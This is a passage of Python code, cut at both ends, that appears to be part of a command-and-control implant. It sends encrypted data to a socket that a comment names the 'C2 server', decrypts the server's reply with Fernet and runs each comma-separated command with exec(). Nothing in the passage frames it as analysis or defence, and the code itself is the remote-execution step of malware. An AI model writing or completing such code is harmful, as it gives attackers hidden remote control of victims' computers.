    s.send(encrypted_commands)
    
    # Receive the response from the C2 server
    encrypted_response = s.recv(1024)
    response = fernet.decrypt(encrypted_response).decode()
    
    # Execute the commands
    for command in response.split(','):
        exec(command)
    
    # Close the connection
    s.close()
